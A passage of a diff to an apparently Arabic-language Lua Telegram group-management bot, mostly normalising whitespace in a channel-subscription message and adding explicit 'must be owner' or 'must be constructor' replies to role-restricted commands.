+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6357,7 +6451,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6384,7 +6478,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6406,7 +6500,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا ����ستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا ����ستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6431,7 +6525,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6459,7 +6553,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6480,7 +6574,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6509,7 +6603,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6536,7 +6630,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6558,7 +6652,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا ����ستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا ����ستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6583,7 +6677,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6614,7 +6708,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6635,7 +6729,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6664,7 +6758,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6691,7 +6785,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6713,7 +6807,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا ����ستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا ����ستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6738,7 +6832,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6816,7 +6910,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6838,7 +6932,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6867,7 +6961,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6894,7 +6988,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6916,7 +7010,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -6941,7 +7035,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7004,7 +7098,11 @@ Reply_Status(msg,msg.sender_user_id_,"reply","☉┇ قام بنشر صوره ا
 DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
 end   
 end
-if text == 'تفعيل التحويل' and CoSu(msg) then   
+if text == 'تفعيل التحويل' then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
 Text = 'تم تفعيل تحويل الصيغ'
 database:del(bot_id..'DRAGOON:change:sofi'..msg.chat_id_)  
@@ -7013,7 +7111,11 @@ Text = ' ☉┇ بالتاكيد تم تفعيل امر تحويل'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل التحويل' and CoSu(msg) then  
+if text == 'تعطيل التحويل' then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
 database:set(bot_id..'DRAGOON:change:sofi'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل امر تحويل'
@@ -7068,12 +7170,20 @@ end
 end
 -------------------
 ------------------------------------------------------------------------
-if text == ("مسح الاساسين") and CoSu(msg) then
+if text == ("مسح الاساسين") then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Basic:Constructor'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, '\n ☉┇ تم مسح المنشئين الاساسين')
 return false
 end
-if text == 'المنشئين الاساسين' and CoSu(msg) then
+if text == 'المنشئين الاساسين' then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
 t = "\n ☉┇ قائمة المنشئين الاساسين \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -7107,13 +7217,17 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 
-if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
+if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7135,7 +7249,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7164,7 +7278,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7181,13 +7295,17 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
+if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7209,7 +7327,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7234,7 +7352,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7252,13 +7370,21 @@ end;end,nil)
 return false
 end
 ------------------------------------------------------------------------
-if text == 'مسح المنشئين' and BasicConstructor(msg) then
+if text == 'مسح المنشئين' then
+if not BasicConstructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Constructor'..msg.chat_id_)
 texts = ' ☉┇ تم مسح المنشئين '
 send(msg.chat_id_, msg.id_, texts)
 end
 
-if text == ("المنشئين") and BasicConstructor(msg) then
+if text == ("المنشئين") then
+if not BasicConstructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
 t = "\n ☉┇ قائمة المنشئين \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -7308,13 +7434,17 @@ end
 end
 end,nil)   
 end
-if text == "رفع منشئ" and msg.reply_to_message_id_ and BasicConstructor(msg) then
+if text == "رفع منشئ" and msg.reply_to_message_id_ then
+if not BasicConstructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7335,7 +7465,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7364,7 +7494,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7380,13 +7510,17 @@ status  = '\n ☉┇ تم ترقيته منشئ'
 send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 end
-if text and text:match("^تنزيل منشئ$") and msg.reply_to_message_id_ and BasicConstructor(msg) then
+if text and text:match("^تنزيل منشئ$") and msg.reply_to_message_id_ then
+if not BasicConstructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7408,7 +7542,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7433,7 +7567,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7450,12 +7584,20 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 end
 ------------------------------------------------------------------------
-if text == 'مسح المدراء' and Constructor(msg) then
+if text == 'مسح المدراء' then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Manager'..msg.chat_id_)
 texts = ' ☉┇ تم مسح المدراء '
 send(msg.chat_id_, msg.id_, texts)
 end
-if text == ("المدراء") and Constructor(msg) then
+if text == ("المدراء") then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
 t = "\n ☉┇ قائمة المدراء \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -7487,13 +7629,17 @@ t = " ☉┇ لا يوجد مدراء"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("رفع مدير") and msg.reply_to_message_id_ and Constructor(msg) then
+if text == ("رفع مدير") and msg.reply_to_message_id_ then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7515,7 +7661,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7545,7 +7691,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7562,13 +7708,17 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end  
-if text == ("تنزيل مدير") and msg.reply_to_message_id_ and Constructor(msg) then
+if text == ("تنزيل مدير") and msg.reply_to_message_id_ then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7590,7 +7740,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
